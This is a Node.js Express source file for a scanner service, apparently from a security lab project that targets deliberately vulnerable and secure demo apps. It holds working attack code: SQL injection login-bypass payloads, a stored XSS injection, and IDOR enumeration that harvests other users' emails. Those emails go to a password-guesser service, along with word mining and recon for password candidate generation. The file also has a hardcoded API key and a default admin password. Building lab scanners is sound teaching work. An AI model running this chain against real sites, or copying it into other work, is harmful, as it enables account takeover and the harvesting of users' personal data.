const express = require('express');
const axios = require('axios');
const { MongoClient } = require('mongodb');

const mongoClient = new MongoClient('mongodb://host.docker.internal:27017');
let scansCollection;

async function connectMongo() {
    await mongoClient.connect();
    const db = mongoClient.db('security_project');
    scansCollection = db.collection('scans');
    console.log('MongoDB connected');
}
connectMongo();

const app = express();
app.use(express.json());
const cors = require('cors');
app.use(cors());

const VALID_API_KEYS = ['secu-demo-key-2026'];

function checkApiKey(req, res, next) {
    const key = req.headers['x-api-key'];
    if (!key || !VALID_API_KEYS.includes(key)) {
        return res.status(401).json({ error: 'Missing or invalid API key' });
    }
    next();
}

app.use(checkApiKey);

// SQLi payloads to test
const sqliPayloads = [
    "' OR '1'='1' #",
    "' OR 1=1 #",
    "admin' --"
];

async function loginAndGetCookie(loginUrl) {
    const response = await axios.post(loginUrl,
        `email=${encodeURIComponent("' OR '1'='1' #")}&password=anything`,
        {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            maxRedirects: 0,
            validateStatus: () => true
        }
    );

    // extract the session cookie from response headers
    const cookie = response.headers['set-cookie'];
    return cookie ? cookie[0] : null;
}

async function notifyPasswordGuesser(baseUrl, emails) {
    if (!emails || emails.length === 0) return;

    const emailTags = emails.map(e => `<email>${e}</email>`).join('');
    const soapRequest = `<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <receiveHarvestedEmails>
        <url>${baseUrl}</url>
        ${emailTags}
        </receiveHarvestedEmails>
    </soap:Body>
    </soap:Envelope>`;

    try {
        await axios.post('http://password-guesser:5000/soap', soapRequest, {
            headers: {
                'Content-Type': 'text/xml',
                'X-API-Key': 'secu-demo-key-2026'
            },
            timeout: 5000
        });
        console.log(`[SOA] Forwarded ${emails.length} harvested email(s) to password-guesser`);
    } catch (err) {
        console.log('Failed to notify password-guesser of harvested emails:', err.message);
    }
}

async function getRecon(ip) {
    try {
        const response = await axios.get(`http://shodan-clone:8080/api/host/${ip}`, {
            headers: { 'X-API-Key': 'secu-demo-key-2026' },
            validateStatus: () => true
        });
        if (response.status === 200 && response.data) {
            return response.data;
        }
        return { found: false };
    } catch (err) {
        console.log('Recon failed:', err.message);
        return { found: false, error: err.message };
    }
}

const xml2js = require('xml2js');
const xmlParser = new xml2js.Parser({ explicitArray: true });

async function getPasswordCandidates(seed) {
    try {
        const soapBody = `<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <generate>
      <seed>${seed}</seed>
    </generate>
  </soap:Body>
</soap:Envelope>`;

        const response = await axios.post('http://password-guesser:5000/soap', soapBody, {
            headers: {
                'Content-Type': 'text/xml',
                'X-API-Key': 'secu-demo-key-2026'
            }
        });

        const parsed = await xmlParser.parseStringPromise(response.data);
        const candidates = parsed['soap:Envelope']['soap:Body'][0]['generateResponse'][0]['candidate'];
        return candidates || [];
    } catch (err) {
        console.log('Password guesser failed:', err.message);
        return [];
    }
}

async function getMinedWords(url) {
    try {
        const soapBody = `<?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <mine>
            <url>${url}</url>
            </mine>
        </soap:Body>
        </soap:Envelope>`;

        const response = await axios.post('http://password-guesser:5000/soap', soapBody, {
            headers: {
                'Content-Type': 'text/xml',
                'X-API-Key': 'secu-demo-key-2026'
            }
        });

        const parsed = await xmlParser.parseStringPromise(response.data);
        const words = parsed['soap:Envelope']['soap:Body'][0]['mineResponse'][0]['word'];
        return words || [];
    } catch (err) {
        console.log('Word mining failed:', err.message);
        return [];
    }
}

const OWASP_INFO = {
    sqli: { name: 'SQL Injection', owasp: 'A03:2021 – Injection', cwe: 'CWE-89' },
    xss: { name: 'Cross-Site Scripting (XSS)', owasp: 'A03:2021 – Injection', cwe: 'CWE-79' },
    idor: { name: 'Insecure Direct Object Reference (IDOR)', owasp: 'A01:2021 – Broken Access Control', cwe: 'CWE-639' }
};

// Tries the SQLi-bypass login first (works on vulnerable), falls back to a real
// known login (works on secure) — so IDOR testing works against either target.
async function loginAnyWay(baseUrl) {
    const bypassCookie = await loginAndGetCookie(`${baseUrl}/login`);
    if (bypassCookie) return bypassCookie;

    try {
        const response = await axios.post(`${baseUrl}/login`,
            `email=${encodeURIComponent('admin@secure.com')}&password=${encodeURIComponent('admin123')}`,
            {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                maxRedirects: 0,
                validateStatus: () => true
            }
        );
        const cookie = response.headers['set-cookie'];
        return cookie ? cookie[0] : null;
    } catch (err) {
        return null;
    }
}

async function testAndHarvestIDOR(baseUrl) {
    const cookie = await loginAnyWay(baseUrl);
    if (!cookie) {
        return { vulnerable: false, error: 'Could not establish a session to test IDOR', harvestedEmails: [] };
    }

    const myRes = await axios.get(`${baseUrl}/account`, {
        headers: { Cookie: cookie },
        validateStatus: () => true
    });
    const idMatch = myRes.data.match(/<strong>ID:<\/strong>\s*(\d+)/);
    const ownId = idMatch ? parseInt(idMatch[1]) : null;

    const harvested = [];
    for (let id = 1; id <= 10; id++) {
        const res = await axios.get(`${baseUrl}/account?id=${id}`, {
            headers: { Cookie: cookie },
            validateStatus: () => true
        });
        if (res.status === 200) {
            const emailMatch = res.data.match(/<strong>Email:<\/strong>\s*([^\s<]+)/);
            if (emailMatch) harvested.push({ id, email: emailMatch[1] });
        }
    }

    const others = harvested.filter(h => h.id !== ownId);
    const vulnerable = others.length > 0;
    const emails = [...new Set(harvested.map(h => h.email))];

    // SOA requirement: Scanner forwards harvested emails to Password Guesser server-to-server
    await notifyPasswordGuesser(baseUrl, emails);

    return {
        vulnerable,
        payload: vulnerable ? `GET ${baseUrl}/account?id=${others[0].id}` : null,
        evidence: vulnerable
            ? `Logged in as account ${ownId}, but accessed ${others.length} other account(s), e.g. id ${others[0].id} (email: ${others[0].email})`
            : 'No other account was accessible — ownership check appears enforced',
        harvestedEmails: emails
    };
}

async function testXSS(baseUrl) {
    // baseUrl example: http://localhost:3000
    const loginUrl = `${baseUrl}/login`;
    const commentsUrl = `${baseUrl}/comments`;
    const xssPayload = "<script>alert('XSS')</script>";

    // step 1: login and get the cookie
    const cookie = await loginAndGetCookie(loginUrl);
    if (!cookie) {
        return { vulnerable: false, error: "Could not login" };
    }

    // step 2: post the XSS payload as a comment, using the cookie
    await axios.post(commentsUrl,
        `comment=${encodeURIComponent(xssPayload)}`,
        {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            }
        }
    );

    // step 3: load the comments page and check if the payload is unescaped
    const pageResponse = await axios.get(commentsUrl, {
        headers: { 'Cookie': cookie }
    });

    const isVulnerable = pageResponse.data.includes(xssPayload);

    return {
        vulnerable: isVulnerable,
        payload: xssPayload,
        evidence: isVulnerable
            ? "Script tag found unescaped in page HTML"
            : "Script tag was escaped or not found"
    };
}

async function testSQLi(baseUrl) {
    const targetUrl = `${baseUrl}/login`;
    for (const payload of sqliPayloads) {
        try {
            const response = await axios.post(targetUrl,
                `email=${encodeURIComponent(payload)}&password=anything`,
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    maxRedirects: 0,
                    validateStatus: () => true // don't throw on any status code
                }
            );

            // if login succeeded, it usually redirects (302) to /comments
            if (response.status === 302 && response.headers.location === '/comments') {
                return {
                    vulnerable: true,
                    payload: payload,
                    evidence: `Redirected to /comments using payload: ${payload}`
                };
            }
        } catch (err) {
            console.log('Error testing payload:', payload, err.message);
        }
    }
    return { vulnerable: false };
}

app.post('/api/scan/vulnerabilities', async (req, res) => {
    const targetUrl = req.body.url;
    if (!targetUrl) return res.status(400).json({ error: 'Missing url parameter' });

    const sqliResult = await testSQLi(targetUrl);
    const xssResult = await testXSS(targetUrl);
    const idorResult = await testAndHarvestIDOR(targetUrl);

    const findings = [
        { ...OWASP_INFO.sqli, ...sqliResult },
        { ...OWASP_INFO.xss, ...xssResult },
        { ...OWASP_INFO.idor, vulnerable: idorResult.vulnerable, payload: idorResult.payload, evidence: idorResult.evidence }
    ];

    const report = {
        type: 'vulnerability-scan',
        target: targetUrl,
        timestamp: new Date().toISOString(),
        findings: findings,
        harvestedEmails: idorResult.harvestedEmails
    };

    await scansCollection.insertOne(report);
    res.json(report);
});


// the SOA operation - this is your main "service"
app.post('/api/scan', async (req, res) => {
    const targetUrl = req.body.url;
    if (!targetUrl) {
        return res.status(400).json({ error: 'Missing url parameter' });
    }
    console.log('Scanning target:', targetUrl);

    const hostname = new URL(targetUrl).hostname;

    const recon = await getRecon(hostname);
    const minedWords = await getMinedWords(targetUrl);
    const seeds = minedWords.length > 0 ? minedWords.slice(0, 5) : ['admin'];

    let passwordCandidates = [];
    for (const seed of seeds) {
        const candidates = await getPasswordCandidates(seed);
        passwordCandidates = passwordCandidates.concat(candidates);
    }
    passwordCandidates = [...new Set(passwordCandidates)];

    const sqliResult = await testSQLi(targetUrl);
    const xssResult = await testXSS(targetUrl);

    const scanReport = {
        target: targetUrl,
        timestamp: new Date().toISOString(),
        recon: recon,
        minedWords: minedWords,
        passwordCandidates: passwordCandidates,
        results: {
            sqli: sqliResult,
            xss: xssResult
        }
    };

    await scansCollection.insertOne(scanReport);

    res.json(scanReport);
});

app.get('/api/history', async (req, res) => {
    const allScans = await scansCollection.find().toArray();
    res.json(allScans);
});

app.listen(3002, () => {
    console.log('Scanner service running on http://localhost:3002');
});